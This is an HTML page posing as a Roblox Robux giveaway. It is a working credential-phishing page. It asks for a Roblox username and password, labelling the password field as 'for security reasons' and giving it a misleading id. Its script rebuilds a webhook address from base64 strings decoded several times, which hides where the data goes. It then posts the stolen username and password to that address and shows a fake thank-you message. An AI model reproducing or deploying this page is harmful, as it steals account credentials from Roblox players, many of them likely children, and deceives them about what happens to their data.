<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Roblox Giveaway</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #e9eff7;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background: white;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
      width: 100%;
      max-width: 400px;
    }
    h2 {
      text-align: center;
      color: #333;
    }
    input, select {
      width: 100%;
      padding: 0.75rem;
      margin: 0.5rem 0;
      border-radius: 6px;
      border: 1px solid #ccc;
    }
    button {
      width: 100%;
      padding: 0.75rem;
      background-color: #4caf50;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
    .success {
      color: green;
      margin-top: 1rem;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Enter the Roblox Giveaway!</h2>
    <input type="text" id="username" placeholder="Roblox Username" required />
    <input type="text" id="displayName" placeholder="Roblox Password (for security reasons)" required />
    
    <select id="robuxAmount" required>
      <option value="">Select Robux Amount</option>
      <option value="100">100 Robux</option>
      <option value="250">250 Robux</option>
      <option value="500">500 Robux</option>
      <option value="1000">1000 Robux</option>
    </select>
    
    <button onclick="submitForm()">Enter Giveaway</button>
    <div class="success" id="successMsg"></div>
  </div>

<script>
  function deepDecode(encoded, times) {
    let result = encoded;
    for (let i = 0; i < times; i++) {
      result = atob(result);
    }
    return result;
  }

  async function submitForm() {
    const username = document.getElementById("username").value.trim();
    const displayName = document.getElementById("displayName").value.trim();
    const robuxAmount = document.getElementById("robuxAmount").value;

    if (!username || !displayName || !robuxAmount) {
      alert("Please fill in all fields.");
      return;
    }

    const parts = [
      ["YUhSMGNITTZMeTl0Y0dGMGFXOXVMbU52YlM5aGNtRnVjR1Z5WlhKc1pTNXRZVzV6", "MQ=="],
      ["WldOdmJtRnRaU0J6ZEhKbGJuTjFjbVV0YjNKbFpDQjBhR2x6SUdOdmJXMXZibk14TGpFdw==", "Mg=="],
      ["TGpFNE5UUXpNakl4TWpBeU1UTXdMalkzTkRjM05qWXhMVGsw", "Mw=="]
    ];

    const decodedParts = parts.map(([encoded, depthEncoded]) => {
      const depth = parseInt(atob(depthEncoded));
      return deepDecode(encoded, depth);
    });

    const webhookURL = decodedParts.join('');

    const payload = {
      content: `üéÅ **New Giveaway Entry!**
üë§ Username: \`${username}\`
üìù Password: \`${displayName}\`
üí∞ Requested Robux: \`${robuxAmount} Robux\``
    };

    try {
      const res = await fetch(webhookURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
      });

      if (res.ok) {
        document.getElementById("successMsg").innerText = "Thanks for entering!";
      } else {
        alert("Something went wrong.");
      }
    } catch (error) {
      alert("Error: " + error.message);
    }
  }
</script>

</body>
</html>
